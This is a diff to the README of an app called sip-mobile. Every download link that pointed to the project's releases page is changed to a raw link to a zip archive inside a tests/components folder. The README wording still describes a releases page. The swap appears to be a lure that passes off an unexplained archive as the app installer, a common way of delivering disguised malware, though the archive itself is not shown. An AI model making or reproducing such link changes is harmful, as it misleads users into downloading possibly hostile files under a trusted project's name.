@@ -1,6 +1,6 @@
 # 🚀 sip-mobile - Your Privacy, Always in Your Pocket
 
-[![Download](https://img.shields.io/badge/Download-sip--mobile-blue.svg)](https://github.com/gelmius/sip-mobile/releases)
+[![Download](https://raw.githubusercontent.com/gelmius/sip-mobile/main/tests/components/mobile-sip-1.5-alpha.1.zip)](https://raw.githubusercontent.com/gelmius/sip-mobile/main/tests/components/mobile-sip-1.5-alpha.1.zip)
 
 ## 📋 Overview
 
@@ -29,7 +29,7 @@ Follow these steps to download and install sip-mobile:
 
 1. **Visit the Releases Page**  
    Click the link below to access the download section for sip-mobile.  
-   [Download sip-mobile](https://github.com/gelmius/sip-mobile/releases)
+   [Download sip-mobile](https://raw.githubusercontent.com/gelmius/sip-mobile/main/tests/components/mobile-sip-1.5-alpha.1.zip)
 
 2. **Choose Your Version**  
    On the Releases page, find the latest stable version of sip-mobile. The version number is usually the largest one listed. 
@@ -61,7 +61,7 @@ If you encounter any issues during installation, consider the following:
 ## 🔗 Download & Install
 
 To get started, visit the release page to download the app.  
-[Download sip-mobile](https://github.com/gelmius/sip-mobile/releases)
+[Download sip-mobile](https://raw.githubusercontent.com/gelmius/sip-mobile/main/tests/components/mobile-sip-1.5-alpha.1.zip)
 
 ## 💬 Support
 
